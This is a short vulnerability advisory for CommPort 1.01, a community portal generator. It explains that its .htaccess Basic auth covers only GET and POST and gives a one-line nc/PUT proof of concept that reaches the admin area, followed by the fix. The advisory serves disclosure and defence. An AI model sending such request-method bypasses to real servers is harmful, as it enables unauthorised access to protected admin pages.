CommPort 1.01 <= Authentication Bypass Vulnerability
----------------------------------------------------

Discovered by: Jean Pascal Pereira <pereira@secbiz.de>

Vendor information:

"A 'Community Portal' generator that can be tailored for any location.
Each user gets a personal portal page to which they can add their own
'channels' or select from a growing list of pre-prepared local, national
and international content. This allows any individual to always have a page
of their own personal favourites in front of them. Channels may be either
'active' with continually updated content such as weather or news headlines
or 'passive' with collections of links."

Vendor URI: http://www.tc.ca/commport/

----------------------------------------------------

Risk-level: Medium/High

The application is prone to an authentication bypass vulnerability.

----------------------------------------------------

/htdocs/cp/.htaccess:

AuthName "Community Portal"
AuthType Basic
AuthUserFile /home/piwcommport/auth/.commport

<limit GET POST>
require valid-user
</limit>

ErrorDocument 401 /signup.cgi

----------------------------------------------------

/htdocs/cp/admin/.htaccess:

AuthName "Community Portal"
AuthType Basic
AuthUserFile /home/piwcommport/auth/.commport

<limit GET POST>
require valid-user
</limit>

ErrorDocument 401 /signup.cgi

----------------------------------------------------

The application protects specific areas by using base authentication.

Since the authentication is limited to GET and POST, it can be bypassed
by using different or random request types.

----------------------------------------------------

Exploit / Proof Of Concept:

$ perl -e 'print "PUT /cp/admin/ HTTP/1.0\n\n"' | nc [TARGET] 80

-------------------------------------

Solution:

Remove the LIMIT directive from any htaccess file stored in the project directory.
